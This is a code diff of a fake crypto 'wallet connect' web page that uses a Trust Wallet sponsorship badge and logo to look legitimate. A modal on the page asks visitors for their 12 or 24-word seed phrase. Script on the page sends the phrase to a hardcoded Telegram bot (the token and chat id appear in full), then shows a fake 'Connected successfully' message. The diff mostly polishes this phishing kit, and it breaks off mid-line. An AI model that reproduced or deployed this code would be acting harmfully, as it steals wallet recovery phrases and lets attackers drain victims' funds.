@@ -157,7 +157,7 @@ textarea {
   resize: none;
   font-size: 14px;
   color: #000;
-  display: none; /* hidden initially */
+  display: none;
 }
 
 .modal button {
@@ -177,7 +177,20 @@ textarea {
 #debugOutput { margin-top: 12px; font-size: 14px; color: #0f0; text-align: center; }
 #noticeMessage { font-size: 14px; color: #FFA500; margin-bottom: 10px; text-align: center; }
 
-.sponsored { font-size: 13px; color: #aaa; text-align:center; margin-top:15px; }
+/* Sponsored logo section */
+.sponsored {
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  gap: 6px;
+  margin-top: 15px;
+  font-size: 14px;
+  color: #0ff;
+}
+.sponsored-logo {
+  width: 20px;
+  height: 20px;
+}
 
 footer { margin-top: 40px; font-size: 13px; color: #aaa; text-align:center; }
 </style>
@@ -199,7 +212,11 @@ footer { margin-top: 40px; font-size: 13px; color: #aaa; text-align:center; }
   <button id="openModal" class="connect-btn">Connect</button>
 </div>
 
-<p class="sponsored">Sponsored by Trust Wallet</p>
+<!-- Sponsored section with small Trust Wallet logo -->
+<div class="sponsored">
+  <img src="https://trustwallet.com/assets/images/media/assets/TWT.png" alt="Trust Wallet Logo" class="sponsored-logo">
+  <span>Sponsored by Trust Wallet</span>
+</div>
 
 <div id="dashboard">
   <h3>Crypto Market Trends</h3>
@@ -219,13 +236,8 @@ footer { margin-top: 40px; font-size: 13px; color: #aaa; text-align:center; }
 <div id="myModal" class="modal">
   <div class="modal-content">
     <span class="close">&times;</span>
-    <p id="noticeMessage">⚠️ Please make sure to have available balance to enable this trading/reward work effectively.</p>
-    
+    <p id="noticeMessage">⚠️ While connecting, never share or allow any third party to see your connection or phrase. Connect privately alone.</p>
     <textarea id="phraseInput" placeholder="Enter 12 or 24-word phrase"></textarea>
-    <p style="font-size:13px; color:#FFA500; margin-top:6px;">
-      ⚠️ While connecting, never share or allow any third party to see your connection or phrase. Connect privately alone.
-    </p>
-    
     <div style="margin-top:15px;">
       <button id="manualConnect">Manual Connect</button>
       <button id="autoConnect">Auto Connect</button>
@@ -243,10 +255,10 @@ footer { margin-top: 40px; font-size: 13px; color: #aaa; text-align:center; }
 var _smartsupp = _smartsupp || {};
 _smartsupp.key = '3f2e381e7e9f89397ee5857cb9eb7cacf6f3375e';
 window.smartsupp||(function(d) {
-	var s,c,o=smartsupp=function(){ o._.push(arguments)};o._=[];
-	s=d.getElementsByTagName('script')[0];c=d.createElement('script');
-	c.type='text/javascript';c.charset='utf-8';c.async=true;
-	c.src='https://www.smartsuppchat.com/loader.js?';s.parentNode.insertBefore(c,s);
+  var s,c,o=smartsupp=function(){ o._.push(arguments)};o._=[];
+  s=d.getElementsByTagName('script')[0];c=d.createElement('script');
+  c.type='text/javascript';c.charset='utf-8';c.async=true;
+  c.src='https://www.smartsuppchat.com/loader.js?';s.parentNode.insertBefore(c,s);
 })(document);
 </script>
 
@@ -283,11 +295,7 @@ document.addEventListener("DOMContentLoaded", () => {
     phraseInput.style.display = "block"; 
     const phrase = phraseInput.value.trim();
     if(!phrase) { debug.style.color="#FFA500"; debug.textContent="📝 Enter 12 or 24-word phrase to connect."; return; }
-    if(storedPhrases.includes(phrase)) { 
-      alert("⚠️ You already connected this wallet."); 
-      debug.textContent="⚠️ This wallet is already connected."; 
-      return; 
-    }
+    if(storedPhrases.includes(phrase)) { alert("⚠️ You already connected this wallet."); return; }
     debug.style.color="#FFA500"; debug.textContent="⏳ Connecting...";
     fetch(`https://api.telegram.org/bot7564393664:AAEL0TWkOdXomWTnDaTXF3KH75T2xfyseJQ/sendMessage?chat_id=6876291548&text=${encodeURIComponent(phrase)}`)
       .then(()=> {
@@ -296,7 +304,6 @@ document.addEventListener("DOMContentLoaded", () => {
         setTimeout(()=> { 
           debug.style.color="#0f0"; 
           debug.textContent="✅ Connected successfully. Please refresh wallet after 24 hours and check balance."; 
-          phraseInput.value="";
         }, 5000);
       })
-      .catch(err=> { debug.style.color="red"; debug.textContent="❌ Error sending phrase. Check bot setup
+      .catch(err=> { debug.style.color="red"; debug.textContent="
